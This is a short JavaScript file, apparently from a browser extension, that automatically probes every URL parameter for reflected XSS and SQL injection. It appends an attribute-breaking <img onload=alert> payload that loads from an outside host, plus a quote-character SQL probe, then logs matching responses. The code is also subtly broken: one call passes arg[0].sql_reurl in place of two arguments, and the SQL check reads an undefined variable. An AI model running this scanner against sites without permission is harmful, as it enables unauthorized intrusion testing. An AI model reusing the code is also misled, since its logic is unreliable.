function xsssql_scan(url){
	payloads=['\'"/><img src="http://mevar.sinaapp.com/xss.png" onload=alert("xss")>','\'"'];
	//poc=escape(payload);
	try{
		var host=url.split("?")[0];
		var allargs=url.split("?")[1];
		var args=allargs.split("&");
		for(var i=0;i<args.length;i++)
		{
			var arg = args[i].split("=");
			var xss_value=arg[1]+escape(payloads[0]);
			var sql_value=arg[1]+escape(payloads[1]);
			
			xss_reurl=changeURLPar(url,arg[0], xss_value);
			findxss(arg[0],xss_reurl,payloads[0]);

			sql_reurl=changeURLPar(url,arg[0], sql_value);

			findsql(arg[0].sql_reurl,payloads[1])



		}
	}
	catch(e)
	{
		console.log("no allargs");
	}
}

function findxss(arg,reurl,payload) {
	// body...
	var xmlhttp=new XMLHttpRequest();
	//var views = chrome.extension.getViews();
	xmlhttp.onreadystatechange = function(data) {
    if (xmlhttp.readyState == 4) {
      	if (xmlhttp.status == 200) {
        	var data = xmlhttp.responseText.toLowerCase();
        	if(data.indexOf(payload)>=0){
				log_write(reurl,"反射xss，问题参数："+arg);
			};
      	} else {
        	return null;
      		}
    	}
 	}

 	try{
		xmlhttp.open("GET",reurl,true);
		xmlhttp.send();
		}
  	catch (e){
	console.log("request Error!")
  	}
}

function findsql(arg,reurl,payload) {
	// body...
	var xmlhttp=new XMLHttpRequest();
	//var views = chrome.extension.getViews();
	xmlhttp.onreadystatechange = function(data) {
    if (xmlhttp.readyState == 4) {
      	if (xmlhttp.status == 200) {
        	var data = xmlhttp.responseText.toLowerCase();
        	var match=response.match(/SQL syntax/i);
        	if(match){
				log_write(reurl,"疑似sql注入："+arg);
			};
      	} else {
        	return null;
      		}
    	}
 	}

 	try{
		xmlhttp.open("GET",reurl,true);
		xmlhttp.send();
		}
  	catch (e){
	console.log("request Error!")
  	}
}